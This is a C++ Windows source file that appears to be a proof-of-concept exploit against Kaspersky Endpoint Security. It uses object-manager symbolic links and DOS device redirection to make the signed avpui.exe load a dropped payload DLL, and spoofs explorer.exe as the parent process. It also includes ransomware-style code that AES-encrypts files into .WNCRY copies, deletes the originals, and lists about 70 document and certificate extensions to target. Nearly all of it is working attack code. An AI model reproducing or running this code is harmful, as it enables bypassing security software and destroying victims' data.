// ONLY COMPILE FOR X64

#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <ShlObj.h>
#include <conio.h>
#include <AclAPI.h>
#include <io.h>  
#include <ios>
#include <cstdio>
#include <fcntl.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <vector>
#include <cstdint>
#include <shellapi.h>
#include <shlwapi.h>
#include <sddl.h>
#include "ntdll.h"
#include "resource.h"
#pragma comment(lib, "ntdll")
#pragma comment(lib, "WindowsApp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "onecore.lib")
#pragma comment(lib, "shlwapi.lib")


#define ALL_SHARING FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE

typedef struct _FILE_LINK_INFORMATION
{
	BOOLEAN ReplaceIfExists;
	HANDLE RootDirectory;
	ULONG FileNameLength;
	_Field_size_bytes_(FileNameLength) WCHAR FileName[1];
} FILE_LINK_INFORMATION, * PFILE_LINK_INFORMATION;


typedef struct _REPARSE_DATA_BUFFER {
	ULONG  ReparseTag;
	USHORT ReparseDataLength;
	USHORT Reserved;
	union {
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			ULONG Flags;
			WCHAR PathBuffer[1];
		} SymbolicLinkReparseBuffer;
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			WCHAR PathBuffer[1];
		} MountPointReparseBuffer;
		struct {
			UCHAR  DataBuffer[1];
		} GenericReparseBuffer;
	} DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)





bool Aes128CbcEncrypt(
	const uint8_t* plaintext,
	size_t plaintextSize,
	const uint8_t key[16],
	const uint8_t iv[16],
	char** EncryptedBuff,
	size_t* EncryptedBuffSz)
{
	char* poldEncryptedBuff = *EncryptedBuff;
	std::vector<uint8_t> ciphertext = { 0 };
	BCRYPT_ALG_HANDLE algorithm = nullptr;
	BCRYPT_KEY_HANDLE keyHandle = nullptr;
	std::vector<uint8_t> keyObject;
	std::vector<uint8_t> mutableIv(iv, iv + 16);

	NTSTATUS status;
	DWORD blockLength = 0;
	DWORD resultLength = 0;
	DWORD keyObjectLength = 0;
	ULONG bytesWritten = 0;

	// Open the AES provider.
	status = BCryptOpenAlgorithmProvider(
		&algorithm,
		BCRYPT_AES_ALGORITHM,
		nullptr,
		0);

	if (!BCRYPT_SUCCESS(status))
		return false;

	// Use CBC mode.
	status = BCryptSetProperty(
		algorithm,
		BCRYPT_CHAINING_MODE,
		reinterpret_cast<PUCHAR>(
			const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_CBC)),
		sizeof(BCRYPT_CHAIN_MODE_CBC),
		0);

	if (!BCRYPT_SUCCESS(status))
		goto cleanup;

	// Find the required key-object size.
	status = BCryptGetProperty(
		algorithm,
		BCRYPT_OBJECT_LENGTH,
		reinterpret_cast<PUCHAR>(&keyObjectLength),
		sizeof(keyObjectLength),
		&resultLength,
		0);

	if (!BCRYPT_SUCCESS(status))
		goto cleanup;

	keyObject.resize(keyObjectLength);

	// Create the AES-128 key.
	status = BCryptGenerateSymmetricKey(
		algorithm,
		&keyHandle,
		keyObject.data(),
		static_cast<ULONG>(keyObject.size()),
		const_cast<PUCHAR>(key),
		16,
		0);

	if (!BCRYPT_SUCCESS(status))
		goto cleanup;

	// Query the required ciphertext size.
	status = BCryptEncrypt(
		keyHandle,
		const_cast<PUCHAR>(plaintext),
		static_cast<ULONG>(plaintextSize),
		nullptr,
		mutableIv.data(),
		16,
		nullptr,
		0,
		&bytesWritten,
		BCRYPT_BLOCK_PADDING);

	if (!BCRYPT_SUCCESS(status))
		goto cleanup;

	ciphertext.resize(bytesWritten);

	// BCryptEncrypt can modify the IV, so reset it before actual encryption.
	mutableIv.assign(iv, iv + 16);

	status = BCryptEncrypt(
		keyHandle,
		const_cast<PUCHAR>(plaintext),
		static_cast<ULONG>(plaintextSize),
		nullptr,
		mutableIv.data(),
		16,
		ciphertext.data(),
		static_cast<ULONG>(ciphertext.size()),
		&bytesWritten,
		BCRYPT_BLOCK_PADDING);

	if (!BCRYPT_SUCCESS(status))
		goto cleanup;

	ciphertext.resize(bytesWritten);

	if (*EncryptedBuffSz < ciphertext.size()) {
		*EncryptedBuff = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, ciphertext.size());
		HeapFree(GetProcessHeap(), NULL, poldEncryptedBuff);
	}
	memmove(*EncryptedBuff, ciphertext.data(), ciphertext.size());
	*EncryptedBuffSz = ciphertext.size();
cleanup:
	if (keyHandle)
		BCryptDestroyKey(keyHandle);

	if (algorithm)
		BCryptCloseAlgorithmProvider(algorithm, 0);

	return BCRYPT_SUCCESS(status);
}



bool DoEncryptFile(wchar_t* filepath,wchar_t* hardlink, wchar_t* sys32dir, HANDLE hwindir)
{
	wchar_t rptarget[] = { L"\\??\\C:\\Windows" };
	DWORD targetsz = wcslen(rptarget) * 2;
	DWORD printnamesz = 1 * 2;
	DWORD pathbuffersz = targetsz + printnamesz + 12;
	DWORD totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
	REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz);
	rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
	rdb->Reserved = NULL;
	rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
	rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
	memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
	rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
	rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
	memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, rptarget, printnamesz);

	bool retval = true;
	bool EncFileDelRequired = true;
	wchar_t encfile[MAX_PATH] = { 0 };
	wsprintf(encfile, L"%ws.WNCRYT", filepath);
	wchar_t encfilefinal[MAX_PATH] = { 0 };
	wsprintf(encfilefinal, L"\\??\\%ws.WNCRY", filepath);
	HANDLE henc, henc2 = NULL;
	LARGE_INTEGER li = { 0 };
	SYSTEM_INFO si = { 0 };
	SIZE_T filesz = 0;
	SIZE_T BytesToRead = 0;
	SIZE_T BytesLeft = 0;
	SIZE_T retbytes = 0;
	SIZE_T EncryptedBuffSz = NULL;
	DWORD PageSz = NULL;
	char* FileContent = NULL;
	char* EncryptedContent = NULL;
	FILE_RENAME_INFO* fni = NULL;
	FILE_DISPOSITION_INFO fdi = { 0 };
	UNICODE_STRING uhlink = { 0 };
	RtlInitUnicodeString(&uhlink, hardlink);
	OBJECT_ATTRIBUTES objattr = { 0 };
	DWORD ret = NULL;
	NTSTATUS stat = STATUS_SUCCESS;
	henc = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE | DELETE, ALL_SHARING, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (!henc || henc == INVALID_HANDLE_VALUE)
	{
		retval = false;
		printf("LOG: Failed to open %ws, %d\n", filepath, GetLastError());
		goto cleanup;
	}


	if (!GetFileSizeEx(henc, &li))
	{
		printf("LOG: Failed to get file size %ws\n", filepath);
		retval = false;
		goto cleanup;
	}
	filesz = li.QuadPart;
	if (!filesz)
	{
		retval = true;
		goto cleanup;
	}
	henc2 = CreateFile(encfile, GENERIC_WRITE | DELETE, ALL_SHARING, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!henc2 || henc2 == INVALID_HANDLE_VALUE)
	{
		retval = false;
		printf("LOG: Failed to open encryption file %ws, error : %d\n", encfile, GetLastError());
		goto cleanup;
	}

	GetSystemInfo(&si);
	PageSz = si.dwPageSize;
	FileContent = (char*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, PageSz);
	EncryptedContent = (char*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, PageSz);
	EncryptedBuffSz = PageSz;
	do {
		ZeroMemory(FileContent, PageSz);
		ZeroMemory(EncryptedContent, EncryptedBuffSz);
		BytesToRead = PageSz < filesz ? PageSz : filesz;
		if (!ReadFile(henc, FileContent, BytesToRead, (DWORD*)&retbytes, NULL))
		{
			goto cleanup;
		}
		// generate IV 
		GUID key = { 0 };
		CoCreateGuid(&key);
		GUID iv = { 0 };
		CoCreateGuid(&iv);
		if (!Aes128CbcEncrypt((const uint8_t*)FileContent, retbytes, (const uint8_t*)&key, (const uint8_t*)&iv, &EncryptedContent, (size_t*)&EncryptedBuffSz))
			goto cleanup;

		if (!WriteFile(henc2, EncryptedContent, EncryptedBuffSz, (DWORD*)&retbytes, NULL))
		{
			goto cleanup;
		}
		filesz -= BytesToRead;

	} while (BytesToRead);

	fni = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, sizeof(FILE_RENAME_INFO) + wcslen(encfilefinal) * sizeof(wchar_t));
	fni->ReplaceIfExists = TRUE;
	fni->FileNameLength = wcslen(encfilefinal) * sizeof(wchar_t);
	memmove(&fni->FileName[0], encfilefinal, wcslen(encfilefinal) * sizeof(wchar_t));
	if (!SetFileInformationByHandle(henc2, FileRenameInfo, fni, sizeof(FILE_RENAME_INFO) + wcslen(encfilefinal) * sizeof(wchar_t)))
	{
		printf("LOG : Failed to move %ws to %ws\n", encfile, encfilefinal);
		goto cleanup;
	}
	
	fdi.DeleteFileW = true;
	if (!SetFileInformationByHandle(henc, FileDispositionInfo, &fdi, sizeof(fdi)))
	{
		printf("LOG: Failed to remove victim file.\n");
		goto cleanup;
	}


	InitializeObjectAttributes(&objattr, &uhlink, OBJ_CASE_INSENSITIVE, NULL, NULL);
	stat = NtDeleteFile(&objattr);
	if (stat)
	{
		printf("Failed to delete hardlink, error : 0x%0.8X\n", stat);
		return 1;
	}
	RemoveDirectory(sys32dir);


	ret = DeviceIoControl(hwindir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, NULL);
	HeapFree(GetProcessHeap(), NULL, rdb);


	EncFileDelRequired = false;

cleanup:
	if (henc) {

		CloseHandle(henc);
	}
	if (henc2)
	{
		if (EncFileDelRequired)
		{
			FILE_DISPOSITION_INFO fdi = { 1 };
			SetFileInformationByHandle(henc2, FileDispositionInfo, &fdi, sizeof(fdi));
		}
		CloseHandle(henc2);
	}
	if (fni)
		HeapFree(GetProcessHeap(), NULL, fni);
	if (FileContent)
		HeapFree(GetProcessHeap(), NULL, FileContent);
	if (EncryptedContent)
		HeapFree(GetProcessHeap(), NULL, EncryptedContent);

	return retval;
}


bool ShouldEncryptFile(wchar_t* filename)
{
	wchar_t* fileext = PathFindExtension(filename);
	const wchar_t* extensions[] = {
	L"odt", L"ods", L"odp", L"odm", L"odc", L"odb", L"doc", L"docx",
	L"docm", L"wps", L"xls", L"xlsx", L"xlsm", L"xlsb", L"xlk", L"ppt",
	L"pptx", L"pptm", L"mdb", L"accdb", L"pst", L"dwg", L"dxf", L"dxg",
	L"wpd", L"rtf", L"wb2", L"pdf", L"mdf", L"dbf", L"psd", L"pdd",
	L"eps", L"ai", L"indd", L"cdr", L"jpg", L"jpe", L"dng", L"3fr",
	L"arw", L"srf", L"sr2", L"bay", L"crw", L"cr2", L"dcr", L"kdc",
	L"erf", L"mef", L"mrw", L"nef", L"nrw", L"orf", L"raf", L"raw",
	L"rwl", L"rw2", L"r3d", L"ptx", L"pef", L"srw", L"x3f", L"der",
	L"cer", L"crt", L"pem", L"pfx", L"p12", L"p7b", L"p7c", L"1cd"
	};
	for (const wchar_t* ext : extensions)
	{
		if (_wcsicmp(ext, fileext) == 0)
			return true;
	}
	return false;
}



typedef struct _FILE_PROCESS_IDS_USING_FILE_INFORMATION
{
	ULONG NumberOfProcessIdsInList;
	_Field_size_(NumberOfProcessIdsInList) HANDLE ProcessIdList[1];
} FILE_PROCESS_IDS_USING_FILE_INFORMATION, * PFILE_PROCESS_IDS_USING_FILE_INFORMATION;

HANDLE GetExplorerProcess()
{
	wchar_t exp[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%windir%\\explorer.exe", exp, MAX_PATH);
	HANDLE hexp = CreateFile(exp, GENERIC_READ, ALL_SHARING, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hexp || hexp == INVALID_HANDLE_VALUE)
		return NULL;

	IO_STATUS_BLOCK iostat = { 0 };
	FILE_PROCESS_IDS_USING_FILE_INFORMATION* fpi = (FILE_PROCESS_IDS_USING_FILE_INFORMATION*)malloc(sizeof(FILE_PROCESS_IDS_USING_FILE_INFORMATION) + sizeof(HANDLE) * 100);
	NTSTATUS stat = NtQueryInformationFile(hexp, &iostat, fpi, sizeof(FILE_PROCESS_IDS_USING_FILE_INFORMATION) + sizeof(HANDLE) * 100, FileProcessIdsUsingFileInformation);
	if (stat)
	{
		printf("Failed to get explorer PID, error : 0x%0.8X\n", stat);
		return NULL;
	}
	for (int i = 0; i < fpi->NumberOfProcessIdsInList; i++)
	{
		//HANDLE hproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_CREATE_PROCESS, FALSE, (DWORD)fpi->ProcessIdList[i]);
		HANDLE hproc = OpenProcess(MAXIMUM_ALLOWED, FALSE, (DWORD)fpi->ProcessIdList[i]);
		if (hproc)
			return hproc;
	}
	return NULL;
}



int main()
{
	

	wchar_t tmpworkdir[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%USERPROFILE%\\Desktop\\Kaspy", tmpworkdir, MAX_PATH);

	SHFILEOPSTRUCT shfo = {
	NULL,
	FO_DELETE,
	tmpworkdir,
	NULL,
	FOF_SILENT | FOF_NOERRORUI | FOF_NOCONFIRMATION,
	FALSE,
	NULL,
	NULL };

	SHFileOperation(&shfo);

	CreateDirectory(tmpworkdir, NULL);

	{
		wchar_t p[MAX_PATH] = { 0 };
		wsprintf(p, L"\\\\localhost\\C$\\%ws\\mrkaspy.jpg", &tmpworkdir[3]);
		HANDLE hfile = CreateFile(p, GENERIC_WRITE, ALL_SHARING, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!hfile || hfile == INVALID_HANDLE_VALUE)
		{
			printf("Failed to create mrkaspy !!!!\n");
			return 1;
		}
		HRSRC hResInfojpg = FindResource(NULL, MAKEINTRESOURCE(IDR_JPG1), L"jpg");
		HGLOBAL hResDatajpg = LoadResource(NULL, hResInfojpg);
		LPVOID pResourceDatajpg = LockResource(hResDatajpg);
		DWORD dwSizejpg = SizeofResource(NULL, hResInfojpg);
		DWORD rr = 0;
		if (!WriteFile(hfile, pResourceDatajpg, dwSizejpg, &rr, NULL))
		{
			printf("Failed to write mr kaspy.\n");
			return 1;
		}
		CloseHandle(hfile);
	}


	wchar_t kaspy[MAX_PATH] = { 0 };
	wsprintf(kaspy, L"%ws\\mrkaspy.jpg", tmpworkdir);

	wchar_t windir[MAX_PATH] = { 0 };
	wchar_t sys32dir[MAX_PATH] = { 0 };
	wsprintf(windir, L"%ws\\Windows", tmpworkdir);
	wsprintf(sys32dir, L"%ws\\System32", windir);
	CreateDirectory(windir, NULL);
	CreateDirectory(sys32dir, NULL);
	HANDLE hdir2 = CreateFile(windir, GENERIC_WRITE, ALL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (!hdir2 || hdir2 == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open kaspy directory.\n");
		return 1;
	}

	HANDLE hexplorer = GetExplorerProcess();
	if(!hexplorer)
		hexplorer = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_CREATE_PROCESS, FALSE, GetCurrentProcessId());
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	UuidCreate(&uid);
	UuidToStringW(&uid, &wuid);
	wchar_t* wuid2 = (wchar_t*)wuid;

	HANDLE hkaspy = CreateFile(kaspy, GENERIC_WRITE, ALL_SHARING, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hkaspy || hkaspy == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create %ws\n",kaspy);
		return 1;
	}

	wchar_t hardlink[MAX_PATH] = { 0 };
	wsprintf(hardlink, L"\\??\\%ws\\MY_SNAKE_IS_SOLID.dll", sys32dir);
	FILE_LINK_INFORMATION* fli = (FILE_LINK_INFORMATION*)malloc(sizeof(FILE_LINK_INFORMATION) + wcslen(hardlink) * sizeof(wchar_t));
	ZeroMemory(fli, sizeof(FILE_LINK_INFORMATION) + wcslen(hardlink) * sizeof(wchar_t));
	fli->ReplaceIfExists = TRUE;
	fli->FileNameLength = wcslen(hardlink) * sizeof(wchar_t);
	memmove(&fli->FileName[0], hardlink, fli->FileNameLength);
	IO_STATUS_BLOCK iostat = { 0 };
	NTSTATUS stat = NtSetInformationFile(hkaspy, &iostat, fli, sizeof(FILE_LINK_INFORMATION) + wcslen(hardlink) * sizeof(wchar_t), FileLinkInformation);
	if (stat)
	{
		printf("Failed to create kaspy hardlink, error : 0x%0.8X\n", stat);
		return 1;
	}

	CloseHandle(hkaspy);




	HANDLE hwatchdir = CreateFile(tmpworkdir, GENERIC_READ, ALL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (!hwatchdir || hwatchdir == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open kaspy directory.\n");
		return 1;
	}



	HKEY hk = NULL;
	LSTATUS lst = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\KasperskyLab\\protected\\KES", NULL, KEY_READ, &hk);
	if (lst)
	{
		printf("Failed to open kaspersky registry key, error : %d\n", lst);
		return 1;
	}
	DWORD ltype = REG_SZ;
	wchar_t loc[MAX_PATH] = { 0 };
	DWORD locsz = sizeof(loc);
	lst = RegQueryValueEx(hk, L"ProductRoot", NULL, &ltype, (LPBYTE)loc, &locsz);
	if (lst)
	{
		printf("Failed to query kaspersky registry key, error : %d\n", lst);
		return 1;
	}
	RegCloseKey(hk);
	loc[wcslen(loc) - 1] = NULL;

	wchar_t productinfdll[MAX_PATH] = { 0 };
	wsprintf(productinfdll, L"%ws\\product_info.dll", loc);
	wchar_t ushatadll[MAX_PATH] = { 0 };
	wsprintf(ushatadll, L"%ws\\ushata.dll", loc);
	wchar_t avpui[MAX_PATH] = { 0 };
	wsprintf(avpui, L"%ws\\avpui.exe", loc);
	wchar_t avpuidll[MAX_PATH] = { 0 };
	wsprintf(avpuidll, L"%ws\\avpuimain.dll", loc);
	const wchar_t* dirs[] = { L"Program Files (x86)", L"Program Files (x86)\\Kaspersky Lab", &loc[3]};
	const wchar_t* files[] = { L"Windows\\Globalization\\Sorting\\SortDefault.nls",
		&productinfdll[3], &ushatadll[3], &avpui[3], &avpuidll[3]};



	HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), L"dll");
	HGLOBAL hResData = LoadResource(NULL, hResInfo);
	LPVOID pResourceData = LockResource(hResData);
	DWORD dwSize = SizeofResource(NULL, hResInfo);
	wchar_t payload[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%TEMP%\\", payload, MAX_PATH);
	wcscat(payload, wuid2);
	wcscat(payload, L"_avpui.dll");

	HANDLE hpayload = CreateFile(payload, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hpayload || hpayload == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create payload file, error : %d\n", GetLastError());
		return 1;
	}
	DWORD writtenbytes = 0;
	if (!WriteFile(hpayload, pResourceData, dwSize, &writtenbytes, NULL) || writtenbytes != dwSize)
	{
		printf("Failed to write payload file, error : %d\n", GetLastError());
		return 1;
	}
	CloseHandle(hpayload);


	TOKEN_STATISTICS tokenstat = { 0 };
	DWORD tokenret = 0;
	if (!GetTokenInformation(GetCurrentProcessToken(), TokenStatistics, &tokenstat, sizeof(tokenstat), &tokenret))
	{
		printf("Failed to get current token information, error : %d\n", GetLastError());
		return 1;
	}
	stat = STATUS_SUCCESS;
	wchar_t ksdospath[MAX_PATH] = { 0 };
	DWORD sid = 0;
	ProcessIdToSessionId(GetCurrentProcessId(), &sid);
	wchar_t currdosdv[MAX_PATH] = { 0 };
	wsprintf(currdosdv, L"\\Sessions\\0\\DosDevices\\%0.8X-%0.8X", tokenstat.AuthenticationId.HighPart, tokenstat.AuthenticationId.LowPart);
	UNICODE_STRING _currdosdv = { 0 };
	RtlInitUnicodeString(&_currdosdv, currdosdv);
	OBJECT_ATTRIBUTES currdosdvobjattr = { 0 };
	InitializeObjectAttributes(&currdosdvobjattr, &_currdosdv, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hogdir = NULL;
	stat = NtOpenDirectoryObject(&hogdir, MAXIMUM_ALLOWED, &currdosdvobjattr);
	if (stat)
	{
		printf("Failed to open object directory : 0x%0.8X\n", stat);
		return 1;
	}

	wsprintf(ksdospath, L"KASPERSKY-%ws", wuid2);
	UNICODE_STRING _ksdospath = { 0 };
	RtlInitUnicodeString(&_ksdospath, ksdospath);
	OBJECT_ATTRIBUTES ksdosobjattr = { 0 };
	InitializeObjectAttributes(&ksdosobjattr, &_ksdospath, OBJ_CASE_INSENSITIVE, hogdir, NULL);

	HANDLE hdir = NULL;
	stat = NtCreateDirectoryObject(&hdir, MAXIMUM_ALLOWED, &ksdosobjattr);
	if (stat)
	{
		printf("Failed to create directory object : 0x%0.8X\n", stat);
		return 1;
	}

	wchar_t maindrv[MAX_PATH] = { 0 };
	wsprintf(maindrv, L"\\??\\C:");
	UNICODE_STRING _maindrv = { 0 };
	RtlInitUnicodeString(&_maindrv, maindrv);
	wchar_t maindrvtarget[MAX_PATH] = { 0 };
	wsprintf(maindrvtarget, L"%ws\\%ws", currdosdv, ksdospath);
	UNICODE_STRING _maindrvtarget = { 0 };
	RtlInitUnicodeString(&_maindrvtarget, maindrvtarget);
	OBJECT_ATTRIBUTES _maindrvobjattr = { 0 };
	InitializeObjectAttributes(&_maindrvobjattr, &_maindrv, OBJ_CASE_INSENSITIVE, NULL, NULL);


	wchar_t wdir[MAX_PATH] = { 0 };
	wsprintf(wdir, L"%ws\\Windows", ksdospath);
	wchar_t wdirtarget[MAX_PATH] = { L"\\Device\\BootDevice\\Windows" };
	DefineDosDevice(DDD_RAW_TARGET_PATH, wdir, wdirtarget);


	for (const wchar_t* dir : dirs)
	{
		wchar_t childdir[MAX_PATH] = { 0 };
		wsprintf(childdir, dir);
		UNICODE_STRING _maindrv = { 0 };
		RtlInitUnicodeString(&_maindrv, childdir);
		OBJECT_ATTRIBUTES _maindrvobjattr = { 0 };
		InitializeObjectAttributes(&_maindrvobjattr, &_maindrv, OBJ_CASE_INSENSITIVE, hdir, NULL);
		HANDLE hchilddir = NULL;
		stat = NtCreateDirectoryObject(&hchilddir, DIRECTORY_ALL_ACCESS, &_maindrvobjattr);
		if (stat)
		{
			printf("Failed to create directory object : 0x%0.8X\n", stat);
			return 1;
		}

	}

	wchar_t nname[] = { L"avpuimain.dll" };
	for (const wchar_t* file : files)
	{
		wchar_t src[MAX_PATH] = { 0 };
		wsprintf(src, L"%ws\\%ws", ksdospath, file);

		UNICODE_STRING _src = { 0 };
		RtlInitUnicodeString(&_src, src);
		wchar_t target[MAX_PATH] = { 0 };
		if (_wcsicmp(file, L"Program Files (x86)\\Kaspersky Lab\\KES.14.0.0\\avpuimain.dll") == 0)
		{
			wsprintf(target, L"\\Device\\BootDevice\\%ws", &payload[3]);
		}
		else {
			wsprintf(target, L"\\Device\\BootDevice\\%ws", file);
		}
		UNICODE_STRING _target = { 0 };
		RtlInitUnicodeString(&_target, target);
		DefineDosDevice(DDD_RAW_TARGET_PATH, src, target);
	}
	

	HANDLE hnotify = CreateEvent(NULL, FALSE, FALSE,  L"Local\\HardBreacher-SolidSnake-Sync-Event");
	
	
	UNICODE_STRING NtImagePath, CurrentDirectory, CommandLine, DllPath;
	RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Program Files (x86)\\Kaspersky Lab\\KES.14.0.0\\avpui.exe");
	RtlInitUnicodeString(&CurrentDirectory, (PWSTR)L"C:\\Windows\\System32");
	RtlInitUnicodeString(&CommandLine, (PWSTR)L"\"C:\\Program Files (x86)\\Kaspersky Lab\\KES.14.0.0\\avpui.exe\"");
	RtlInitUnicodeString(&DllPath, (PWSTR)L"\\??\\C:\\Windows\\System32");
	// user process parameters

	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, &DllPath, &CurrentDirectory, &CommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

	// process create info
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	// initialise attribute list
	PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE) * 2);
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

	// set image name
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[0].Size = NtImagePath.Length;
	AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

	// obtain handle to parent
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, 0, 0, 0, 0);


	// add parent process attribute
	AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
	AttributeList->Attributes[1].Size = sizeof(HANDLE);
	AttributeList->Attributes[1].ValuePtr = GetExplorerProcess();

	

	// spawn process
	HANDLE hProcess, hThread = NULL;
	NTSTATUS st = NtCreateUserProcess(&hProcess, &hThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, NULL, NULL, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);
	if (st)
	{
		printf("Failed to create user process, error : 0x%0.8X\n", st);
		return 1;
	}
	
	RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
	RtlDestroyProcessParameters(ProcessParameters);


	HANDLE hmaindrv = NULL;
	stat = NtCreateSymbolicLinkObject(&hmaindrv, MAXIMUM_ALLOWED, &_maindrvobjattr, &_maindrvtarget);
	if (stat)
	{
		printf("Failed to create directory object : 0x%0.8X\n", stat);
		return 1;
	}


	printf("All done, press any key to resume process.\n");


	ResumeThread(hThread);

	WaitForSingleObject(hnotify, INFINITE);
	CloseHandle(hmaindrv);
	printf("Received dll load confirmation.\n");


	DoEncryptFile(kaspy, hardlink, sys32dir, hdir2);
	return 0;
}